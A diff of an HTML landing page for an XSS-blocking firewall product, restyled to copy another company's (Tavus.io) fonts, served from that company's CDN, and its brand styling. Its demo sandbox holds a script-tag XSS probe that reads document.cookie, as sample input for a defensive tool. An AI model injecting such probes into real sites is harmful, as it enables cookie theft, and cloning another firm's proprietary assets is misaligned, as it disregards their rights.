@@ -1,326 +1,470 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SecureScript — The Intelligent Defense Layer</title>
+  <title>SecureScript: The Intelligent Defense Layer</title>
   <meta name="description" content="Sub-millisecond hybrid neural Web Application Firewall. Protect any web application from XSS attacks with zero code changes.">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          fontFamily: {
-            sans: ['"Plus Jakarta Sans"', 'sans-serif'],
-            mono: ['"JetBrains Mono"', 'monospace'],
-          },
-          colors: {
-            tavus: {
-              bg: '#08090d',
-              card: '#0f1118',
-              cardBorder: 'rgba(255, 255, 255, 0.08)',
-              orange: '#ff5c35',
-              orangeGlow: 'rgba(255, 92, 53, 0.25)',
-              accent: '#38bdf8',
-            }
-          }
-        }
-      }
-    }
-  </script>
-
+  <!-- Exact Tavus.io Fonts from Production Webflow CDN -->
   <style>
+    @font-face {
+      font-family: 'Suisse Intl';
+      src: url('https://cdn.prod.website-files.com/68c8e57d6e512b9573db146f/68c8e57e6e512b9573db1a38_SuisseIntl-Regular.woff2') format('woff2');
+      font-weight: 400;
+      font-style: normal;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Suisse Intl';
+      src: url('https://cdn.prod.website-files.com/68c8e57d6e512b9573db146f/68c8e57e6e512b9573db1a27_SuisseIntl-Medium.woff2') format('woff2');
+      font-weight: 500;
+      font-style: normal;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Suisse Intl';
+      src: url('https://cdn.prod.website-files.com/68c8e57d6e512b9573db146f/68c8e57e6e512b9573db1a26_SuisseIntl-Light.woff2') format('woff2');
+      font-weight: 300;
+      font-style: normal;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Perfectlynineties';
+      src: url('https://cdn.prod.website-files.com/68c8e57d6e512b9573db146f/68c8e57e6e512b9573db1a22_PerfectlyNineties-Italic.woff') format('woff');
+      font-weight: 400;
+      font-style: italic;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Perfectlynineties';
+      src: url('https://cdn.prod.website-files.com/68c8e57d6e512b9573db146f/68c8e57e6e512b9573db1a23_PerfectlyNineties-Regular.woff') format('woff');
+      font-weight: 400;
+      font-style: normal;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Fk Raster Grotesk Compact Blended';
+      src: url('https://cdn.prod.website-files.com/68c8e57d6e512b9573db146f/68c8e57e6e512b9573db1a21_FK%20Raster%20Grotesk%20Compact%20Blended.woff2') format('woff2');
+      font-weight: 400;
+      font-style: normal;
+      font-display: swap;
+    }
+
+    /* Exact Tavus.io CSS Variables & Color Primitives */
+    :root {
+      --primatives--pc-plastic-1: #f7f4ef;
+      --primatives--pc-plastic-2: #eae5de;
+      --primatives--pc-plastic-3: #e4ddd2;
+      --primatives--pc-plastic-4: #d9d0c2;
+      --primatives--terminal-black: #140206;
+      --primatives--hardware-gray-9: #28292a;
+      --primatives--hardware-gray-8: #484748;
+      --primatives--static-white: #ffffff;
+      
+      --primatives--atomic-glow-4: #ff6810;  /* Tavus Orange */
+      --primatives--atomic-glow-1: #ffb835;  /* Tavus Amber */
+      --primatives--atomic-glow-5: #ffe8bc;
+      --primatives--bubbletech-4: #ff6183;   /* Tavus Coral Pink */
+      --primatives--bubbletech-1: #ffb4c5;
+      --primatives--neon-field-4: #0cb531;   /* Tavus Green */
+      --primatives--neon-field-2: #38f261;
+      --primatives--floppy-fog-1: #e4e0f2;   /* Tavus Lavender */
+      --primatives--frost-5: #b8deff;        /* Tavus Cyan */
+
+      --themes--background: var(--primatives--pc-plastic-1);
+      --themes--background-2: var(--primatives--pc-plastic-2);
+      --themes--text: var(--primatives--hardware-gray-9);
+      --themes--border: var(--primatives--terminal-black);
+
+      --_typography---primary-font-family: 'Suisse Intl', Arial, sans-serif;
+      --_typography---secondary-font-family: 'Perfectlynineties', Georgia, serif;
+      --_typography---tertiary-font-family: 'Fk Raster Grotesk Compact Blended', monospace;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      background-color: #08090d;
-      color: #f1f5f9;
-      font-family: 'Plus Jakarta Sans', sans-serif;
+      margin: 0;
+      padding: 0;
+      border: 10px solid var(--primatives--pc-plastic-2);
+      background-color: var(--themes--background);
+      color: var(--themes--text);
+      font-family: var(--_typography---primary-font-family);
+      font-size: 1rem;
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
       overflow-x: hidden;
     }
 
-    /* Tavus subtle grid background */
-    .tavus-grid {
-      background-image: 
-        radial-gradient(circle at 50% -20%, rgba(255, 92, 53, 0.18), transparent 70%),
-        radial-gradient(circle at 100% 60%, rgba(56, 189, 248, 0.08), transparent 50%),
-        linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
-        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-      background-size: 100% 100%, 100% 100%, 36px 36px, 36px 36px;
+    /* Tavus typography classes */
+    .font-serif-italic {
+      font-family: var(--_typography---secondary-font-family);
+      font-style: italic;
+      font-weight: 400;
+    }
+    .text-type-raster {
+      font-family: var(--_typography---tertiary-font-family);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      font-size: 0.72rem;
+      font-weight: 400;
     }
 
-    /* Tavus OS Window styling */
-    .os-window {
-      background: rgba(15, 17, 24, 0.85);
-      backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.09);
-      box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.03);
-      border-radius: 14px;
-      overflow: hidden;
-      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    /* Tavus exact retro neo-brutalist buttons */
+    .tavus-btn-primary {
+      background-color: var(--primatives--atomic-glow-4);
+      color: #ffffff;
+      border: 1px solid var(--themes--border);
+      box-shadow: 3px 3px 0 0 var(--themes--border);
+      font-family: var(--_typography---primary-font-family);
+      font-weight: 500;
+      transition: transform 0.1s ease, box-shadow 0.1s ease;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
     }
-    .os-window:hover {
-      border-color: rgba(255, 92, 53, 0.35);
-      box-shadow: 0 30px 70px -15px rgba(255, 92, 53, 0.12), 0 0 0 1px rgba(255, 92, 53, 0.2);
+    .tavus-btn-primary:hover {
+      transform: translate(1px, 1px);
+      box-shadow: 2px 2px 0 0 var(--themes--border);
+    }
+    .tavus-btn-primary:active {
+      transform: translate(3px, 3px);
+      box-shadow: 0 0 0 0 var(--themes--border);
     }
 
-    /* Tavus OS Title Bar */
-    .os-titlebar {
-      background: rgba(20, 23, 33, 0.95);
-      border-bottom: 1px solid rgba(255, 255, 255, 0.07);
-      padding: 9px 14px;
+    .tavus-btn-secondary {
+      background-color: var(--primatives--pc-plastic-2);
+      color: var(--themes--text);
+      border: 1px solid var(--themes--border);
+      box-shadow: 3px 3px 0 0 var(--themes--border);
+      font-family: var(--_typography---primary-font-family);
+      font-weight: 500;
+      transition: transform 0.1s ease, box-shadow 0.1s ease;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .tavus-btn-secondary:hover {
+      background-color: var(--primatives--static-white);
+      transform: translate(1px, 1px);
+      box-shadow: 2px 2px 0 0 var(--themes--border);
+    }
+    .tavus-btn-secondary:active {
+      transform: translate(3px, 3px);
+      box-shadow: 0 0 0 0 var(--themes--border);
+    }
+
+    .tavus-btn-pink {
+      background-color: var(--primatives--bubbletech-4);
+      color: #ffffff;
+      border: 1px solid var(--themes--border);
+      box-shadow: 3px 3px 0 0 var(--themes--border);
+      font-family: var(--_typography---primary-font-family);
+      font-weight: 500;
+      transition: transform 0.1s ease, box-shadow 0.1s ease;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .tavus-btn-pink:hover {
+      transform: translate(1px, 1px);
+      box-shadow: 2px 2px 0 0 var(--themes--border);
+    }
+
+    /* Tavus Exact Window Box */
+    .tavus-window {
+      background-color: var(--primatives--static-white);
+      border: 1px solid var(--themes--border);
+      box-shadow: 4px 4px 0 0 var(--themes--border);
+      position: relative;
+    }
+    .tavus-window-terminal {
+      background-color: var(--primatives--terminal-black);
+      border: 1px solid var(--themes--border);
+      box-shadow: 6px 6px 0 0 var(--themes--border);
+      color: var(--primatives--pc-plastic-1);
+    }
+
+    /* Tavus Window Titlebar */
+    .tavus-win-title {
+      background-color: var(--primatives--pc-plastic-2);
+      border-bottom: 1px solid var(--themes--border);
+      padding: 6px 12px;
       display: flex;
       align-items: center;
       justify-content: space-between;
     }
 
-    /* Tavus OS horizontal lines */
-    .os-lines {
+    /* Tavus OS Lines handle */
+    .tavus-os-lines {
       display: flex;
       flex-direction: column;
       gap: 2.5px;
-      width: 42px;
+      width: 32px;
     }
-    .os-lines span {
+    .tavus-os-lines span {
       height: 1px;
-      background: rgba(255, 255, 255, 0.15);
+      background: var(--themes--border);
       width: 100%;
     }
 
-    /* Monospace badge */
-    .raster-tag {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.68rem;
-      letter-spacing: 0.09em;
+    /* Tavus square indicator dot */
+    .win-dot-square {
+      width: 8px;
+      height: 8px;
+      border: 1px solid var(--themes--border);
+      display: inline-block;
+      flex-shrink: 0;
+    }
+
+    /* Tavus Label Component */
+    .tavus-label {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 3px 8px;
+      border: 1px solid var(--themes--border);
+      background-color: var(--primatives--pc-plastic-2);
+      box-shadow: 2px 2px 0 0 var(--themes--border);
+      font-family: var(--_typography---tertiary-font-family);
+      font-size: 0.72rem;
+      letter-spacing: 0.08em;
       text-transform: uppercase;
-      font-weight: 600;
-    }
-
-    /* Code editor styling */
-    pre, code {
-      font-family: 'JetBrains Mono', monospace;
-    }
-
-    /* Pulse animation */
-    @keyframes subtlePulse {
-      0%, 100% { opacity: 0.8; transform: scale(1); }
-      50% { opacity: 1; transform: scale(1.05); }
-    }
-    .status-dot {
-      animation: subtlePulse 2.5s infinite ease-in-out;
+      color: var(--themes--text);
     }
   </style>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 </head>
-<body class="min-h-screen tavus-grid selection:bg-orange-500 selection:text-white">
+<body>
 
   <!-- ============================================================================== -->
-  <!-- Navigation Header (Tavus Glass Nav)                                             -->
+  <!-- Exact Tavus.io Top Navigation Bar                                              -->
   <!-- ============================================================================== -->
-  <header class="sticky top-0 z-50 backdrop-blur-xl bg-[#08090d]/80 border-b border-white/[0.08]">
+  <header style="background-color: var(--primatives--pc-plastic-1); border-bottom: 1px solid var(--themes--border);" class="sticky top-0 z-50">
     <div class="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
-      <div class="flex items-center gap-6">
-        <a href="/platform" class="flex items-center gap-2.5 text-white group">
-          <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-orange-500 to-amber-600 flex items-center justify-center text-white shadow-lg shadow-orange-500/25 group-hover:scale-105 transition">
-            <i class="fa-solid fa-shield-halved text-sm"></i>
+      
+      <!-- Brand Logo -->
+      <div class="flex items-center gap-8">
+        <a href="/platform" class="flex items-center gap-2.5 text-inherit no-underline group">
+          <div class="w-7 h-7 bg-[#ff6810] border border-[#140206] shadow-[2px_2px_0_0_#140206] flex items-center justify-center text-white">
+            <i class="fa-solid fa-shield-halved text-xs"></i>
           </div>
-          <span class="font-bold text-lg tracking-tight text-white">SecureScript</span>
-          <span class="px-2 py-0.5 text-[10px] font-mono font-semibold bg-white/5 text-orange-400 border border-orange-500/20 rounded">v1.0</span>
+          <span style="font-family: 'Suisse Intl'; font-weight: 500; font-size: 1.15rem; letter-spacing: -0.02em; color: var(--themes--text);">
+            SecureScript
+          </span>
+          <span class="text-type-raster px-1.5 py-0.5 border border-[#140206] bg-[#eae5de] text-[10px]">
+            v1.0
+          </span>
         </a>
 
-        <nav class="hidden md:flex items-center gap-6 text-sm text-slate-400">
-          <a href="#features" class="hover:text-white transition">Architecture</a>
-          <a href="#simulator" class="hover:text-white transition">Live Sandbox</a>
-          <a href="#developer" class="hover:text-white transition">API & SDK</a>
-          <a href="/dashboard" target="_blank" class="hover:text-white transition flex items-center gap-1.5">
-            <span>Ops Console</span>
-            <i class="fa-solid fa-arrow-up-right-from-square text-[10px] text-slate-500"></i>
+        <!-- Navigation Links -->
+        <nav class="hidden md:flex items-center gap-6 text-sm" style="font-family: 'Suisse Intl'; color: var(--primatives--hardware-gray-8);">
+          <a href="#pipeline" class="hover:text-black transition no-underline text-inherit">Architecture</a>
+          <a href="#sandbox" class="hover:text-black transition no-underline text-inherit">Live Sandbox</a>
+          <a href="#quickstart" class="hover:text-black transition no-underline text-inherit">Developers</a>
+          <a href="/dashboard" target="_blank" class="hover:text-black transition no-underline text-inherit flex items-center gap-1.5">
+            <span>SIEM Console</span>
+            <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i>
           </a>
-          <a href="/docs" target="_blank" class="hover:text-white transition">Docs</a>
+          <a href="/docs" target="_blank" class="hover:text-black transition no-underline text-inherit">Docs</a>
         </nav>
       </div>
 
+      <!-- Action Buttons -->
       <div class="flex items-center gap-3">
-        <a href="/login" class="px-4 py-1.5 text-sm font-medium text-slate-300 hover:text-white hover:bg-white/5 rounded-lg transition border border-transparent">
-          Login
+        <a href="/login" class="tavus-btn-secondary px-4 py-1.5 text-xs text-type-raster">
+          LOGIN
         </a>
-        <a href="/signup" class="px-4 py-1.5 text-sm font-semibold text-black bg-white hover:bg-slate-200 rounded-lg shadow-[0_0_20px_rgba(255,255,255,0.2)] transition flex items-center gap-1.5">
-          <span>Get Started</span>
-          <i class="fa-solid fa-arrow-right text-xs"></i>
+        <a href="/signup" class="tavus-btn-primary px-4 py-1.5 text-xs text-type-raster">
+          GET STARTED &rarr;
         </a>
       </div>
+
     </div>
   </header>
 
   <!-- ============================================================================== -->
-  <!-- Hero Section                                                                   -->
+  <!-- Hero Section (Exact Tavus Headline & Serif Italic Accent)                       -->
   <!-- ============================================================================== -->
-  <main class="max-w-7xl mx-auto px-6 pt-20 pb-28">
+  <main class="max-w-7xl mx-auto px-6 pt-16 pb-24">
     
-    <!-- Top Monospace Pill -->
+    <!-- Top Pill Badge -->
     <div class="flex justify-center mb-6">
-      <div class="inline-flex items-center gap-2.5 px-3.5 py-1.5 rounded-full border border-orange-500/30 bg-orange-500/10 text-orange-400 raster-tag shadow-lg shadow-orange-500/10">
-        <span class="w-1.5 h-1.5 bg-orange-500 rounded-sm status-dot"></span>
-        <span>THE HYBRID INTELLIGENCE FIREWALL</span>
+      <div class="tavus-label">
+        <span class="win-dot-square" style="background-color: var(--primatives--atomic-glow-4);"></span>
+        <span>THE HYBRID INTELLIGENCE DEFENSE LAYER</span>
       </div>
     </div>
 
-    <!-- Hero Title & Subtitle -->
-    <div class="text-center max-w-4xl mx-auto mb-12">
-      <h1 class="text-5xl sm:text-6xl md:text-7xl font-bold tracking-tight text-white leading-[1.08] mb-6">
-        The <em class="italic text-transparent bg-clip-text bg-gradient-to-r from-orange-400 via-amber-300 to-orange-500">neural</em> interface for web defense
+    <!-- Main Headline with Tavus Perfectlynineties Italic -->
+    <div class="text-center max-w-4xl mx-auto mb-10">
+      <h1 style="font-family: 'Suisse Intl', Arial, sans-serif; font-size: clamp(2.8rem, 6vw, 5.2rem); font-weight: 400; line-height: 1.05; letter-spacing: -0.035em; color: var(--primatives--terminal-black); margin-bottom: 1.25rem;">
+        The <em class="font-serif-italic" style="color: var(--primatives--atomic-glow-4);">neural</em> interface for web defense
       </h1>
-      <p class="text-lg md:text-xl text-slate-400 max-w-2xl mx-auto leading-relaxed">
-        Deploy a 3-tier inline firewall that normalizes, inspects, and blocks advanced XSS payloads in sub-milliseconds. Zero code modification. Zero DNS changes.
+      
+      <p style="font-family: 'Suisse Intl', sans-serif; font-size: clamp(1rem, 2vw, 1.2rem); color: var(--primatives--hardware-gray-8); max-width: 680px; margin: 0 auto; line-height: 1.55;">
+        Deploy real-time, hybrid AI firewalls that inspect, normalize, and neutralize XSS threats in sub-milliseconds. Zero code modification. Zero DNS changes.
       </p>
 
       <!-- Primary Action Buttons -->
-      <div class="flex flex-col sm:flex-row items-center justify-center gap-4 mt-9">
-        <a href="/signup" class="w-full sm:w-auto px-7 py-3.5 bg-gradient-to-r from-orange-500 to-amber-600 hover:from-orange-600 hover:to-amber-700 text-white font-semibold rounded-xl text-base shadow-[0_10px_30px_rgba(255,92,53,0.3)] hover:shadow-[0_15px_35px_rgba(255,92,53,0.4)] transition flex items-center justify-center gap-2">
-          <span>Connect Your Site Free</span>
-          <i class="fa-solid fa-arrow-right text-xs"></i>
+      <div class="flex flex-col sm:flex-row items-center justify-center gap-4 mt-8">
+        <a href="/signup" class="tavus-btn-primary px-7 py-3 text-sm text-type-raster">
+          <span>CONNECT YOUR SITE FREE &rarr;</span>
         </a>
-        <a href="#simulator" class="w-full sm:w-auto px-6 py-3.5 bg-[#141721] hover:bg-[#1a1e2b] text-slate-200 hover:text-white font-medium rounded-xl text-base border border-white/10 transition flex items-center justify-center gap-2">
-          <i class="fa-solid fa-terminal text-xs text-orange-400"></i>
-          <span>Launch Interactive Sandbox</span>
+        <a href="#sandbox" class="tavus-btn-secondary px-6 py-3 text-sm text-type-raster">
+          <i class="fa-solid fa-terminal mr-2" style="color: var(--primatives--atomic-glow-4);"></i>
+          <span>EXPLORE LIVE SANDBOX</span>
         </a>
       </div>
 
       <!-- Quick Metrics Strip -->
-      <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-16 max-w-3xl mx-auto text-left">
-        <div class="p-3.5 rounded-xl bg-white/[0.02] border border-white/[0.06]">
-          <div class="text-2xl font-bold text-white font-mono">&lt; 0.003ms</div>
-          <div class="text-xs text-slate-400 mt-0.5">Fast-Path Lexer Latency</div>
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mt-12 max-w-3xl mx-auto text-left">
+        <div class="tavus-window p-3" style="background-color: var(--primatives--pc-plastic-2);">
+          <div class="text-xl font-bold font-mono" style="color: var(--primatives--terminal-black);">&lt; 0.003ms</div>
+          <div class="text-type-raster mt-0.5" style="color: var(--primatives--hardware-gray-8);">LEXER LATENCY</div>
         </div>
-        <div class="p-3.5 rounded-xl bg-white/[0.02] border border-white/[0.06]">
-          <div class="text-2xl font-bold text-white font-mono">&ge; 98.0%</div>
-          <div class="text-xs text-slate-400 mt-0.5">Detection Accuracy</div>
+        <div class="tavus-window p-3" style="background-color: var(--primatives--pc-plastic-2);">
+          <div class="text-xl font-bold font-mono" style="color: var(--primatives--terminal-black);">&ge; 98.0%</div>
+          <div class="text-type-raster mt-0.5" style="color: var(--primatives--hardware-gray-8);">ACCURACY SLA</div>
         </div>
-        <div class="p-3.5 rounded-xl bg-white/[0.02] border border-white/[0.06]">
-          <div class="text-2xl font-bold text-white font-mono">k = 4</div>
-          <div class="text-xs text-slate-400 mt-0.5">Recursive De-obfuscation</div>
+        <div class="tavus-window p-3" style="background-color: var(--primatives--pc-plastic-2);">
+          <div class="text-xl font-bold font-mono" style="color: var(--primatives--terminal-black);">k = 4</div>
+          <div class="text-type-raster mt-0.5" style="color: var(--primatives--hardware-gray-8);">DE-OBFUSCATION</div>
         </div>
-        <div class="p-3.5 rounded-xl bg-white/[0.02] border border-white/[0.06]">
-          <div class="text-2xl font-bold text-white font-mono">0 Code</div>
-          <div class="text-xs text-slate-400 mt-0.5">Integration Overhead</div>
+        <div class="tavus-window p-3" style="background-color: var(--primatives--pc-plastic-2);">
+          <div class="text-xl font-bold font-mono" style="color: var(--primatives--terminal-black);">0 CODE</div>
+          <div class="text-type-raster mt-0.5" style="color: var(--primatives--hardware-gray-8);">OVERHEAD</div>
         </div>
       </div>
     </div>
 
     <!-- ============================================================================== -->
-    <!-- Interactive Hero Window (Tavus-Style Live Sandbox Card)                        -->
+    <!-- Hero Live Sandbox Window (Exact Tavus Window Chrome)                          -->
     <!-- ============================================================================== -->
-    <div id="simulator" class="mt-8 max-w-5xl mx-auto">
-      <div class="os-window">
-        <!-- Window Title Bar -->
-        <div class="os-titlebar">
-          <div class="flex items-center gap-3">
-            <div class="w-2.5 h-2.5 bg-orange-500 rounded-sm"></div>
-            <span class="raster-tag text-slate-300">SECURESCRIPT CORE v1.0 // LIVE INLINE WAF ENGINE</span>
+    <div id="sandbox" class="mt-8 max-w-5xl mx-auto">
+      <div class="tavus-window">
+        <!-- Titlebar -->
+        <div class="tavus-win-title">
+          <div class="flex items-center gap-2.5">
+            <span class="win-dot-square" style="background-color: var(--primatives--atomic-glow-4);"></span>
+            <span class="text-type-raster" style="color: var(--primatives--terminal-black);">
+              SECURESCRIPT CORE v1.0 // LIVE INLINE WAF ENGINE
+            </span>
           </div>
-          <div class="os-lines hidden sm:flex">
+
+          <div class="tavus-os-lines hidden sm:flex">
+            <span></span>
             <span></span>
             <span></span>
             <span></span>
           </div>
-          <div class="flex items-center gap-1.5 text-xs text-slate-500">
-            <span class="px-2 py-0.5 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded font-mono text-[10px]">INSPECTION ACTIVE</span>
+
+          <div class="flex items-center gap-2">
+            <span class="win-dot-square" style="background-color: var(--primatives--neon-field-4);"></span>
+            <span class="text-type-raster" style="color: var(--primatives--terminal-black);">INSPECTION ACTIVE</span>
           </div>
         </div>
 
         <!-- Window Body -->
-        <div class="p-6 md:p-8">
+        <div class="p-6 md:p-8" style="background-color: var(--primatives--pc-plastic-1);">
           <div class="flex flex-col lg:flex-row gap-8">
             
             <!-- Left: Probe Input Console -->
             <div class="flex-1 space-y-4">
               <div class="flex items-center justify-between">
-                <label class="text-xs font-mono font-semibold uppercase tracking-wider text-slate-400">
-                  Input Stream / Test Payload
+                <label class="text-type-raster" style="color: var(--primatives--terminal-black);">
+                  INPUT STREAM / TEST PROBE
                 </label>
-                <span class="text-xs text-slate-500">Select preset or type custom probe:</span>
+                <span class="text-xs" style="color: var(--primatives--hardware-gray-8);">Select preset attack signature:</span>
               </div>
 
               <!-- Quick Presets -->
               <div class="flex flex-wrap gap-2">
-                <button onclick="setProbe('clean')" class="px-3 py-1 bg-white/5 hover:bg-white/10 border border-white/10 text-slate-300 hover:text-white rounded-md text-xs font-mono transition">
+                <button onclick="setProbe('clean')" class="tavus-btn-secondary px-2.5 py-1 text-xs text-type-raster">
                   Clean Request
                 </button>
-                <button onclick="setProbe('xss_script')" class="px-3 py-1 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-red-400 rounded-md text-xs font-mono transition">
+                <button onclick="setProbe('xss_script')" class="tavus-btn-secondary px-2.5 py-1 text-xs text-type-raster" style="background-color: var(--primatives--atomic-glow-5);">
                   &lt;script&gt; Probe
                 </button>
-                <button onclick="setProbe('xss_encoded')" class="px-3 py-1 bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/30 text-amber-400 rounded-md text-xs font-mono transition">
-                  Recursive Hex Obfuscated
+                <button onclick="setProbe('xss_encoded')" class="tavus-btn-secondary px-2.5 py-1 text-xs text-type-raster" style="background-color: var(--primatives--bubbletech-1);">
+                  Hex Obfuscated
                 </button>
-                <button onclick="setProbe('xss_event')" class="px-3 py-1 bg-purple-500/10 hover:bg-purple-500/20 border border-purple-500/30 text-purple-400 rounded-md text-xs font-mono transition">
+                <button onclick="setProbe('xss_event')" class="tavus-btn-secondary px-2.5 py-1 text-xs text-type-raster" style="background-color: var(--primatives--floppy-fog-1);">
                   DOM Event Sink
                 </button>
               </div>
 
-              <!-- Input Textarea -->
+              <!-- Textarea -->
               <div class="relative">
                 <textarea id="payload-input" rows="4" 
-                  class="w-full p-4 bg-[#0a0c12] border border-white/10 rounded-xl font-mono text-sm text-slate-200 focus:outline-none focus:border-orange-500 focus:ring-1 focus:ring-orange-500 transition"
-                  placeholder="Enter any query parameter, header value, or POST JSON body...">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</textarea>
+                  class="w-full p-4 font-mono text-sm border border-[#140206] shadow-[3px_3px_0_0_#140206] focus:outline-none transition"
+                  style="background-color: var(--primatives--static-white); color: var(--primatives--terminal-black);"
+                  placeholder="Enter query param, header value, or JSON payload...">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</textarea>
               </div>
 
               <!-- Action Bar -->
               <div class="flex items-center justify-between pt-1">
-                <div class="text-xs text-slate-500 font-mono flex items-center gap-2">
-                  <i class="fa-solid fa-microchip text-orange-500"></i>
-                  <span>Pipeline: Normalizer &rarr; Lexer &rarr; Bi-LSTM</span>
+                <div class="text-type-raster" style="color: var(--primatives--hardware-gray-8);">
+                  PIPELINE: NORMALIZER &rarr; LEXER &rarr; BI-LSTM
                 </div>
-                <button onclick="runInspection()" id="btn-inspect"
-                  class="px-5 py-2.5 bg-orange-500 hover:bg-orange-600 text-white font-semibold rounded-lg text-sm shadow-lg shadow-orange-500/20 transition flex items-center gap-2">
-                  <i class="fa-solid fa-play text-xs"></i>
-                  <span>Inspect Stream</span>
+                <button onclick="runInspection()" id="btn-inspect" class="tavus-btn-primary px-5 py-2 text-xs text-type-raster">
+                  <i class="fa-solid fa-play text-[10px] mr-1.5"></i>
+                  <span>INSPECT STREAM</span>
                 </button>
               </div>
             </div>
 
-            <!-- Right: Real-time Telemetry & Verdict Window -->
-            <div class="w-full lg:w-96 bg-[#090b10] border border-white/[0.08] rounded-xl p-5 flex flex-col justify-between">
+            <!-- Right: Exact Tavus Terminal Black Window -->
+            <div class="w-full lg:w-96 tavus-window-terminal p-5 flex flex-col justify-between">
               <div>
-                <div class="flex items-center justify-between pb-3 border-b border-white/[0.08]">
-                  <span class="raster-tag text-slate-400">TELEMETRY VERDICT</span>
-                  <span id="verdict-badge" class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-rose-500/20 text-rose-400 border border-rose-500/30">
+                <div class="flex items-center justify-between pb-3 border-b border-white/20">
+                  <span class="text-type-raster text-white">TELEMETRY VERDICT</span>
+                  <span id="verdict-badge" class="px-2 py-0.5 text-type-raster text-[10px] font-bold" style="background-color: var(--primatives--bubbletech-4); color: #ffffff; border: 1px solid #ffffff;">
                     HTTP 403 BLOCKED
                   </span>
                 </div>
 
-                <!-- Diagnostic Grid -->
+                <!-- Diagnostic Output -->
                 <div class="mt-4 space-y-3 font-mono text-xs">
                   <div>
-                    <div class="text-slate-500 text-[11px]">INCIDENT EVENT ID</div>
-                    <div id="diag-ray-id" class="text-slate-200 font-bold mt-0.5">RAY-9A82F104BC</div>
+                    <div class="text-type-raster text-slate-400">INCIDENT RAY ID</div>
+                    <div id="diag-ray-id" class="text-white font-bold mt-0.5" style="color: var(--primatives--atomic-glow-1);">RAY-9A82F104BC</div>
                   </div>
                   <div>
-                    <div class="text-slate-500 text-[11px]">DECISION PIPELINE STAGE</div>
-                    <div id="diag-stage" class="text-amber-400 font-medium mt-0.5">Fast-Path Lexical Analyzer</div>
+                    <div class="text-type-raster text-slate-400">DECISION PIPELINE STAGE</div>
+                    <div id="diag-stage" class="text-white font-medium mt-0.5">Fast-Path Lexical Analyzer</div>
                   </div>
                   <div>
-                    <div class="text-slate-500 text-[11px]">CONFIDENCE SCORE</div>
-                    <div id="diag-confidence" class="text-rose-400 font-bold mt-0.5">1.0000 (Definitive Threat)</div>
+                    <div class="text-type-raster text-slate-400">CONFIDENCE SCORE</div>
+                    <div id="diag-confidence" class="font-bold mt-0.5" style="color: var(--primatives--neon-field-2);">1.0000 (Definitive Threat)</div>
                   </div>
                   <div>
-                    <div class="text-slate-500 text-[11px]">INSPECTION LATENCY</div>
-                    <div id="diag-latency" class="text-emerald-400 font-medium mt-0.5">0.003 ms</div>
+                    <div class="text-type-raster text-slate-400">INSPECTION LATENCY</div>
+                    <div id="diag-latency" class="font-medium mt-0.5" style="color: var(--primatives--neon-field-1);">0.003 ms</div>
                   </div>
                   <div>
-                    <div class="text-slate-500 text-[11px]">DETECTED PATTERN TOKENS</div>
-                    <div id="diag-tokens" class="text-slate-300 bg-white/5 p-2 rounded border border-white/5 mt-0.5 break-all">
+                    <div class="text-type-raster text-slate-400">TRIGGER TOKENS</div>
+                    <div id="diag-tokens" class="bg-black/60 p-2 border border-white/10 mt-0.5 break-all text-slate-200">
                       ["&lt;script&gt;", "alert("]
                     </div>
                   </div>
                 </div>
               </div>
 
-              <div class="pt-4 border-t border-white/[0.08] mt-4 flex items-center justify-between text-[11px] font-mono text-slate-500">
+              <div class="pt-4 border-t border-white/20 mt-4 flex items-center justify-between text-type-raster text-slate-400 text-[10px]">
                 <span>ACTION: INLINE DROP</span>
-                <span class="text-emerald-400">ZERO ORIGIN LEAK</span>
+                <span style="color: var(--primatives--neon-field-2);">ZERO ORIGIN LEAK</span>
               </div>
             </div>
 
@@ -330,88 +474,94 @@
     </div>
 
     <!-- ============================================================================== -->
-    <!-- Tavus Bento OS Windows Grid (Architecture & Capabilities)                      -->
+    <!-- Bento Grid (3-Tier Engine & Multi-Tenancy Architecture)                         -->
